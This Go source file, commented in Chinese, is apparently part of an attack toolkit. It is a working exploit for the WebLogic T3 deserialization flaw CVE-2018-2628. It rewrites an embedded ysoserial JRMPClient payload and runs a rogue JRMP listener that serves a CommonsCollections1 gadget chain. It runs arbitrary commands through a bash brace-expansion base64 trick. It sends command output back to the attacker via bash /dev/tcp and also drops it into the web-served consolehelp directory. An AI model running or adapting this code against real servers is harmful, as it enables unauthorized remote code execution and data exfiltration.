package weblogic

import (
	"bufio"
	"bytes"
	_ "embed"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"strings"
	"sync/atomic"
	"time"
)

// jrmpHits 记录目标回连监听器的次数，用于回显失败时给出证据
var jrmpHits int32

// CVE-2018-2628：T3 反序列化 + JRMPClient 二次请求。
//
// WebLogic 的 T3 反序列化在 2018 年补丁中把 CC 链加入黑名单，但黑名单没有拦住
// java.rmi.server.RemoteObjectInvocationHandler（JRMPClient）。攻击者在 T3
// 消息里放入一个指向自己 JRMP 监听器的 UnicastRef 代理，目标反序列化时会向
// 监听器发起 DGC 调用，监听器把 CommonsCollections 序列化对象作为返回值下发，
// 目标再次反序列化即触发命令执行。
//
// 本实现内置：
//   - JRMPClient T3 载体模板（ysoserial JRMPClient 生成，host/port 可动态改写）
//   - 纯 Go 的 JRMP 监听器（按 ysoserial JRMPListener 的报文格式实现）
//   - 复用已有 CC1 序列化模板作为下发对象

//go:embed payloads/java/CVE_2018_2628_JRMPClient.bin
var templateJRMPClient []byte

// bavePrefix 是 javax.management.BadAttributeValueExpException 的对象头
// （含 val 字段及 Throwable 父类描述），由真实 ysoserial JRMPListener 回包截取。
// 目标客户端以 ExceptionalReturn 读取返回值，必须能 cast 成 Throwable 才会
// 进入 readObject；裸 CC1（AnnotationInvocationHandler）不满足，故需此包装。
//
//go:embed payloads/java/CVE_2018_2628_BAVE_prefix.bin
var bavePrefix []byte

// templateCC1Java 是从真实 Java JRMPListener 回包中截取的 CC1 对象（含流头），
// 其内部 TC_REFERENCE 句柄编号是在 BAVE 前缀存在的前提下生成的，因此必须与
// bavePrefix 配套使用。裸 CC1 模板直接拼到 BAVE 后会导致句柄错位、反序列化取错类。
//
//go:embed payloads/java/CVE_2018_2628_CC1Java.bin
var templateCC1Java []byte

const (
	jrmpMagic   = 0x4A524D49 // "JRMI"
	jrmpVersion = 2

	jrmpSingleOp = 0x4B // SingleOpProtocol
	jrmpStream   = 0x4C // StreamProtocol

	jrmpAck    = 0x4E
	jrmpCall   = 0x50
	jrmpReturn = 0x51
	jrmpPing   = 0x52
	jrmpPong   = 0x53
	jrmpDGCAck = 0x54
)

// BuildJRMPClientPayload 把模板中的占位地址 10.0.0.1:1099 改写为实际监听地址。
// 模板中 UnicastRef 的布局：77 <blkLen> 00 0a "UnicastRef" 00 08 "10.0.0.1" <port:int32>
func BuildJRMPClientPayload(host string, port int) ([]byte, error) {
	tpl := templateJRMPClient
	const origHost = "10.0.0.1"
	const origPort = 1099

	idx := bytes.Index(tpl, []byte("UnicastRef"))
	if idx < 4 {
		return nil, fmt.Errorf("JRMPClient 模板格式异常")
	}
	blockLenPos := idx - 3 // 0x77 位于 idx-4，长度字节位于 idx-3
	hostLenPos := idx + 10 // "UnicastRef"(10) 之后是 2 字节 host 长度
	hostStart := idx + 12
	portPos := hostStart + len(origHost)

	if !bytes.Equal(tpl[hostLenPos:hostLenPos+2], []byte{0, byte(len(origHost))}) ||
		!bytes.Equal(tpl[hostStart:portPos], []byte(origHost)) {
		return nil, fmt.Errorf("JRMPClient 模板占位符不匹配")
	}
	if got := binary.BigEndian.Uint32(tpl[portPos : portPos+4]); got != origPort {
		return nil, fmt.Errorf("JRMPClient 模板端口不匹配: %d", got)
	}

	delta := len(host) - len(origHost)
	blockLen := int(tpl[blockLenPos]) + delta
	if blockLen < 0 || blockLen > 255 {
		return nil, fmt.Errorf("监听地址过长: %s", host)
	}

	out := make([]byte, 0, len(tpl)+delta)
	out = append(out, tpl[:hostLenPos]...)
	out = append(out, byte(0), byte(len(host)))
	out = append(out, host...)
	out = append(out, tpl[portPos:]...)

	// block data 长度（0x77 <len>）需要同步扩展
	out[blockLenPos] = byte(blockLen)

	newPortPos := portPos + delta
	binary.BigEndian.PutUint32(out[newPortPos:newPortPos+4], uint32(port))

	return out, nil
}

// BuildCC1PayloadForJRMP 构造下发对象：BAVE(CC1)。命令输出写入 /tmp/rce_out.txt，
// 并在给定 exfil（"host:port"）时通过 bash /dev/tcp 回传，实现不依赖 HTTP 的真实回显。
//
// CC1 模板最终以 Runtime.exec(String) 执行参数，exec(String) 会按空白分词。
// 采用经典 brace 展开技巧，使整段 bootstrap 不含字面空白：
//
//	bash -c {echo,<b64>}|{base64,-d}|bash
//
// 分词后为 ["bash","-c","{echo,<b64>}|{base64,-d}|bash"]，bash 对第三个参数做
// brace 展开得到 "echo <b64> | base64 -d | bash"，解码后的脚本即可含任意空格。
func BuildCC1PayloadForJRMP(cmd, exfil string) []byte {
	script := fmt.Sprintf("%s > /tmp/rce_out.txt 2>&1; "+
		"cp /tmp/rce_out.txt /root/Oracle/Middleware/wlserver_10.3/server/lib/consoleapp/consolehelp/rce_out.txt 2>/dev/null; "+
		"cp /tmp/rce_out.txt /home/weblogic/Oracle/Middleware/Oracle_Home/wlserver/server/lib/consoleapp/consolehelp/rce_out.txt 2>/dev/null",
		cmd)
	if exfil != "" {
		script += fmt.Sprintf("; cat /tmp/rce_out.txt > /dev/tcp/%s 2>/dev/null", exfil)
	}
	b64 := base64.StdEncoding.EncodeToString([]byte(script))
	full := "bash -c {echo," + b64 + "}|{base64,-d}|bash"

	cc1 := buildFromTemplate(templateCC1Java, templateInfo{
		cmdDataOffset: 0x480,
		oldCmdLen:     27,
		suffixOffset:  0x49b,
	}, full)
	if bytes.HasPrefix(cc1, []byte{0xAC, 0xED, 0x00, 0x05}) {
		cc1 = cc1[4:]
	}
	out := make([]byte, 0, len(bavePrefix)+len(cc1))
	out = append(out, bavePrefix...)
	out = append(out, cc1...)
	return out
}

// startJRMPListener 在 0.0.0.0:0 上监听，返回实际端口与关闭函数
func startJRMPListener(payload []byte) (int, func(), error) {
	ln, err := net.Listen("tcp", "0.0.0.0:0")
	if err != nil {
		return 0, nil, err
	}
	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			atomic.AddInt32(&jrmpHits, 1)
			go handleJRMP(conn, payload)
		}
	}()
	return ln.Addr().(*net.TCPAddr).Port, func() { ln.Close() }, nil
}

func handleJRMP(conn net.Conn, payload []byte) {
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(30 * time.Second))

	r := bufio.NewReader(conn)
	magic, err := readInt32(r)
	if err != nil || magic != jrmpMagic {
		return
	}
	if _, err := readUint16(r); err != nil { // version
		return
	}
	proto, err := r.ReadByte()
	if err != nil {
		return
	}
	if proto != jrmpSingleOp && proto != jrmpStream {
		return
	}

	w := bufio.NewWriter(conn)

	// SingleOpProtocol 需要先回 ACK（remote host + remote port，与 ysoserial 一致）
	if proto == jrmpSingleOp {
		w.WriteByte(jrmpAck)
		host, port := clientEndpoint(conn)
		writeUTF(w, host)
		binary.Write(w, binary.BigEndian, int32(port))
		w.Flush()
	}

	// 读取客户端已发送的 Call/参数（ObjectOutputStream 头、ObjID、opnum 等），
	// 避免过早关闭导致 RST；ysoserial 也是先读完 Call 再回 Return。
	drainJRMP(conn, r)

	writeJRMPReturn(w, payload)
	w.Flush()
	time.Sleep(300 * time.Millisecond)
}

func clientEndpoint(conn net.Conn) (string, int) {
	if ta, ok := conn.RemoteAddr().(*net.TCPAddr); ok {
		host := ta.IP.String()
		// Java 侧用 InetSocketAddress.getHostName()，回环地址会得到 "localhost"
		if ta.IP.IsLoopback() {
			host = "localhost"
		}
		return host, ta.Port
	}
	return "localhost", 0
}

func drainJRMP(conn net.Conn, r *bufio.Reader) {
	_ = conn.SetReadDeadline(time.Now().Add(400 * time.Millisecond))
	// 从 bufio.Reader 读取，先消费已被缓冲的 Call 数据
	_, _ = io.ReadAll(r)
}

// writeJRMPReturn 按 ysoserial JRMPListener 的格式回包：
// Return(0x51) + ObjectOutputStream 头 + TC_BLOCKDATA(0x77,0x0f) + ExceptionalReturn(2) + UID + 序列化对象
func writeJRMPReturn(w *bufio.Writer, payload []byte) {
	w.WriteByte(jrmpReturn)
	w.Write([]byte{0xAC, 0xED, 0x00, 0x05})

	// UID: int unique + long time + short count。
	// 时间必须是毫秒（System.currentTimeMillis 语义），用秒会被客户端当作 1970 年。
	w.Write([]byte{0x77, 0x0F})
	w.WriteByte(0x02) // ExceptionalReturn：反序列化即触发，类型转换在之后才失败

	now := time.Now()
	binary.Write(w, binary.BigEndian, int32(now.UnixNano()>>8))
	binary.Write(w, binary.BigEndian, now.UnixNano()/int64(time.Millisecond))
	binary.Write(w, binary.BigEndian, int16(0))

	if bytes.HasPrefix(payload, []byte{0xAC, 0xED, 0x00, 0x05}) {
		payload = payload[4:]
	}
	w.Write(payload)
}

func readInt32(r *bufio.Reader) (int32, error) {
	b := make([]byte, 4)
	if _, err := io.ReadFull(r, b); err != nil {
		return 0, err
	}
	return int32(binary.BigEndian.Uint32(b)), nil
}

func readUint16(r *bufio.Reader) (uint16, error) {
	b := make([]byte, 2)
	if _, err := io.ReadFull(r, b); err != nil {
		return 0, err
	}
	return binary.BigEndian.Uint16(b), nil
}

func writeUTF(w *bufio.Writer, s string) {
	b := []byte(s)
	binary.Write(w, binary.BigEndian, int16(len(b)))
	w.Write(b)
}

// startExfilListener 启动一次性回传监听：目标执行命令后通过 bash /dev/tcp 连回，
// 把命令输出送到通道。返回端口与输出通道。
func startExfilListener() (int, <-chan string, func(), error) {
	ln, err := net.Listen("tcp", "0.0.0.0:0")
	if err != nil {
		return 0, nil, nil, err
	}
	ch := make(chan string, 8)
	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return
			}
			go func(c net.Conn) {
				defer c.Close()
				_ = c.SetReadDeadline(time.Now().Add(5 * time.Second))
				b, _ := io.ReadAll(c)
				if len(b) > 0 {
					select {
					case ch <- string(b):
					default:
					}
				}
			}(c)
		}
	}()
	port := ln.Addr().(*net.TCPAddr).Port
	return port, ch, func() { ln.Close() }, nil
}

// Exploit20182628 向目标下发 JRMPClient 载体，并由本地 JRMP 监听器返回 CC1 对象。
// 优先通过 /dev/tcp 回传拿到真实命令输出，其次回退到 consolehelp HTTP 读取。
func Exploit20182628(host string, port int, lhost string, timeout time.Duration, cmd string) (string, error) {
	if lhost == "" {
		return "", fmt.Errorf("缺少 JRMP 监听地址")
	}
	ep, outCh, eclose, err := startExfilListener()
	if err != nil {
		return "", err
	}
	defer eclose()
	// bash 的 /dev/tcp 语法是 host/port（斜杠），不是 host:port
	exfil := fmt.Sprintf("%s/%d", lhost, ep)

	payload := BuildCC1PayloadForJRMP(cmd, exfil)
	lport, closer, err := startJRMPListener(payload)
	if err != nil {
		return "", err
	}
	defer closer()

	client, err := BuildJRMPClientPayload(lhost, lport)
	if err != nil {
		return "", err
	}
	if err := SendT3Payload(host, port, timeout, client); err != nil {
		return "", err
	}

	// 等待目标回连、执行命令并经 /dev/tcp 回传输出
	select {
	case out := <-outCh:
		if strings.TrimSpace(out) != "" {
			return strings.TrimSpace(out), nil
		}
	case <-time.After(8 * time.Second):
	}

	// 回退：部分版本 consolehelp 会被 HTTP 直接服务
	base := fmt.Sprintf("http://%s:%d", host, port)
	for attempt := 0; attempt < 3; attempt++ {
		for _, path := range []string{"/consolehelp/rce_out.txt", "/consolehelp/consolehelp/rce_out.txt"} {
			if out := tryHTTPRead(base + path); out != "" {
				return out, nil
			}
		}
		time.Sleep(1 * time.Second)
	}
	return "", fmt.Errorf("JRMP payload sent (lport=%d) but no echo", lport)
}

// LocalIPForJRMP 猜测本机可被目标访问的地址（优先非 loopback 的 IPv4）
func LocalIPForJRMP(targetHost string) string {
	if strings.HasPrefix(targetHost, "127.") {
		return "127.0.0.1"
	}
	ifaces, err := net.Interfaces()
	if err != nil {
		return "127.0.0.1"
	}
	for _, ifi := range ifaces {
		if ifi.Flags&net.FlagUp == 0 || ifi.Flags&net.FlagLoopback != 0 {
			continue
		}
		addrs, err := ifi.Addrs()
		if err != nil {
			continue
		}
		for _, a := range addrs {
			ipnet, ok := a.(*net.IPNet)
			if !ok || ipnet.IP.To4() == nil {
				continue
			}
			return ipnet.IP.String()
		}
	}
	return "127.0.0.1"
}
